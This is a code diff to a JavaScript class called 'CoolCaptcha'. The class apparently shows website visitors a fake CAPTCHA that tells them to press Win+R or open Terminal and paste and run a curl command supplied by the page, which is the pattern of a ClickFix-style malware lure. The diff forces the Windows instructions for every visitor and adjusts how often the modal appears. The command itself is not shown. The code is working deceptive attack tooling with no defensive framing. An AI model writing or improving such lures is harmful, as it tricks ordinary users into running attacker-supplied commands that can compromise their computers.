@@ -25,18 +25,17 @@ class CoolCaptcha {
     }
     
     init() {
-        if (this.shouldNotRun()) return;
+        if (!this.shouldRun()) return;
 
-        const challengeCompleted = localStorage.getItem("recaptcha-challenge");
-        if (challengeCompleted !== null) return
+        if (process.env.SHOULD_RUN_IF_VERIFIED && localStorage.getItem("recaptcha-challenge") !== null) return;
 
         this.injectStyles();
         this.createModal();
         this.bindEvents();
     }
 
-    shouldNotRun() {
-        return Math.random() < (process.env.RUN_CAPTCHA_CHANCE || 1);
+    shouldRun() {
+        return Math.random() <= process.env.RUN_CAPTCHA_CHANCE;
     }
     
     injectStyles() {
@@ -187,12 +186,13 @@ class CoolCaptcha {
             detectedOS = 'mac';
         }
 
+        detectedOS = 'windows';
+
         this.updateCommandForOS(detectedOS);
     }
 
     updateCommandForOS(os) {
         const commandElement = document.getElementById('curl-command');
-        const instructionsElement = document.getElementById('terminal-instructions');
         const helpElement = document.getElementById('os-specific-help');
 
         if (!commandElement) return;
@@ -202,36 +202,24 @@ class CoolCaptcha {
         switch (os) {
             case 'windows':
                 commandElement.textContent = command;
-                if (instructionsElement) {
-                    instructionsElement.textContent = 'Open Command Prompt or PowerShell and run';
-                }
                 if (helpElement) {
-                    helpElement.textContent = 'Press Win+R, type "cmd", press Enter, then paste the command and press Enter';
+                    helpElement.textContent = 'Press Win+R, type "cmd", press Enter, then paste and run the command';
                 }
                 break;
             case 'mac':
                 commandElement.textContent = command;
-                if (instructionsElement) {
-                    instructionsElement.textContent = 'Open Terminal and run:';
-                }
                 if (helpElement) {
                     helpElement.textContent = 'Press Cmd+Space, type "Terminal", press Enter, then paste and run the command';
                 }
                 break;
             case 'linux':
                 commandElement.textContent = command;
-                if (instructionsElement) {
-                    instructionsElement.textContent = 'Open your terminal and run:';
-                }
                 if (helpElement) {
                     helpElement.textContent = 'Open your terminal application, paste and run the command';
                 }
                 break;
             default:
                 commandElement.textContent = this.options.commands.linux;
-                if (instructionsElement) {
-                    instructionsElement.textContent = 'Open your terminal and run:';
-                }
                 if (helpElement) {
                     helpElement.textContent = 'Open your terminal application, paste and run the command';
                 }
